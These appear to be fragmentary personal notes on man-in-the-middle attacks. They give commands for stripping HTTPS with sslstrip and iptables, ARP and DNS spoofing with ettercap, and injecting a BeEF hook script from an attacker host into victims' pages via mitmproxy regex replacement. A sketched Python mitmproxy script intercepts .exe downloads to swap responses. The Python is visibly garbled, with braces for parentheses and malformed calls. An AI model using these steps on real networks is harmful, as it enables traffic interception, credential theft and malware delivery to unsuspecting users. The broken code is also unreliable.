bypassing HTTPS using SSLSTRIP
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip --help(how to use sslstrip)
sslstrip
iptables -t nat --flush(removing everything)



ETTERCAP plugins
ifconfig
ettercap -Tq -M arp-remote -i eth0 -s ///
leafpad /etc/ettercap/etter.dns
service apache2 start
ettercap -Tq -M arp-remote -i eth0 -S -P dns_spoof /ipaddresstarget// /ipaddressgateway//

Typical Network
ARP SPOOFING
One Way Arp Spoofing




mitproxy
download from github
save in optional folder 
extract
create a new directory
 
using beef to create screenshots and view packets 
injecting javascript on code

regex(:-b:</body>:<script src="http://ipaddress/hook.js"></script></body>  


<script>alert('test'):</script>
<script src="https://ipaddress:3000/hook.js"></script>
  



Editing responses based on Regex
cd /opt
cd mitproxy
ls
./mitmdump --transparent --replace




mitm using python script

import mitmproxy
def request{flow}:
#code to handle request flows 
print{"[+] This is a request flow")



def response (flow):
#code to handle response flows
print{"[+]  This is a response flow")
print(flow.request.pretty.url)
if flow.request.pretty.url.endswith(".exe"):
print{"[+] Got interesting flow"):
mitmproxy.http.HTTPResponse.make( HTTP STATUS CODE,CONTENT,HEADERS)

print(flow)
(remove the print statements to avoiding printing many statements)